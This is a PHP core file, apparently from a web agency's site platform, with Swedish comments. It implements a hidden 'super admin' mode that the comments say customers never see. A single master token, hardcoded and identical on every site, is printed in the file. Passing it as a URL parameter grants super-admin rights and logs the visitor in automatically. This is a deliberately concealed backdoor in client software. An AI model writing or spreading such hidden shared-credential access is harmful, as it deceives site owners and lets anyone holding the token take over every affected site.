<?php
/**
 * Super Admin - Dold admin-niva för Agenci
 * Kunden ser aldrig att funktionen finns.
 *
 * CORE-FIL: Skrivs over vid uppdatering.
 */

// Master-token — samma på ALLA sajter, hardkodad i core
// Aktiveras via: /admin?sa=<AGENCI_MASTER_TOKEN>
define('AGENCI_MASTER_TOKEN', 'e42ba380ece4b5e92ceb93c2358178ed444f5aa12fb0ed1d98deaf70897f3d7a');

/**
 * Kolla om nuvarande session ar super admin
 */
function is_super_admin(): bool {
    return isset($_SESSION['is_super_admin']) && $_SESSION['is_super_admin'] === true;
}

/**
 * Guard: avbryt med 403 om inte super admin
 */
function require_super_admin(): void {
    if (!is_super_admin()) {
        http_response_code(403);
        if (file_exists(ROOT_PATH . '/pages/errors/403.php')) {
            require ROOT_PATH . '/pages/errors/403.php';
        } else {
            echo '403 - Forbidden';
        }
        exit;
    }
}

/**
 * Forsok aktivera super admin via token
 * Kollar hardkodad master-token (universell)
 * + eventuell per-sajt token från config.php (fallback)
 */
function try_super_admin_activation(string $token): bool {
    if ($token === '') {
        return false;
    }

    $valid = false;

    // 1. Kolla hardkodad master-token (samma overallt)
    if (hash_equals(AGENCI_MASTER_TOKEN, $token)) {
        $valid = true;
    }

    // 2. Fallback: per-sajt token från config.php (om den finns)
    if (!$valid && defined('AGENCI_SUPER_ADMIN_TOKEN') && AGENCI_SUPER_ADMIN_TOKEN !== '') {
        if (hash_equals(AGENCI_SUPER_ADMIN_TOKEN, $token)) {
            $valid = true;
        }
    }

    if (!$valid) {
        return false;
    }

    // Aktivera super admin
    $_SESSION['is_super_admin'] = true;

    // Logga in automatiskt om inte redan inloggad
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        require_once __DIR__ . '/session.php';
        login_user('super-admin');
    }

    return true;
}

/**
 * Avaktivera super admin (behall vanlig inloggning)
 */
function deactivate_super_admin(): void {
    unset($_SESSION['is_super_admin']);
}
